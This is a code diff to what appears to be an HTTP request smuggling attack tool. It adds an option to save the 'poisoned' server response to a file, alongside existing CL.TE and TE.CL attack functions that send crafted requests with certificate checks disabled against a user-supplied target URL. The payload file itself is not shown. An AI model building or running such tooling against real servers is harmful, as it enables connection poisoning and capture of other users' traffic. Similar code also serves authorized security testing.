@@ -43,10 +43,11 @@ def no_ssl_verification():
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-v", "--verbose", help="Verbose, show sent requests", action='store_true')
+parser.add_argument("-t", "--test", help="Test if vulnerable", action='store_true')
 parser.add_argument("-p", "--payload", help="Payload File, specify payload file path")
 parser.add_argument("-tc", "--tecl", help="TE.CL Attack", action='store_true')
-parser.add_argument("-t", "--test", help="Test if vulnerable", action='store_true')
 parser.add_argument("-ct", "--clte", help="CL.TE Attack (default)", action='store_true')
+parser.add_argument("-o", "--output", help="Output poisoing response to file")
 parser.add_argument("-u", "--url", help="Target URL", required=True)
 args = parser.parse_args()
 
@@ -60,6 +61,7 @@ IS_TE_CL = args.tecl
 IS_CL_TE = False if args.tecl else True
 URL = args.url
 IS_TEST = args.test
+OUTPUT_PATH = args.output if args.output else None
 
 
 def print_banner():
@@ -129,7 +131,10 @@ def cl_te_attack(smuggling):
     if IS_VERBOSE:
         print_request_cl_te(prepped, prefix, smuggling)
     with no_ssl_verification():
-        s.send(prepped, verify=False, timeout=5)
+        r = s.send(prepped, verify=False, timeout=5)
+        if OUTPUT_PATH:
+            with open(OUTPUT_PATH, "w") as file:
+                file.write(r.text)
     print("[+]Poisoned socket")
     if IS_TEST:
         with no_ssl_verification():
@@ -156,7 +161,10 @@ def te_cl_attack(smuggling):
     if IS_VERBOSE:
         print_request_te_cl(prepped, prefix, smug + FINAL_LINES)
     with no_ssl_verification():
-        s.send(prepped, verify=False, timeout=5)
+        r = s.send(prepped, verify=False, timeout=5)
+        if OUTPUT_PATH:
+            with open(OUTPUT_PATH, "w") as file:
+                file.write(r.text)
     print("[+]Poisoned socket")
     if IS_TEST:
         with no_ssl_verification():
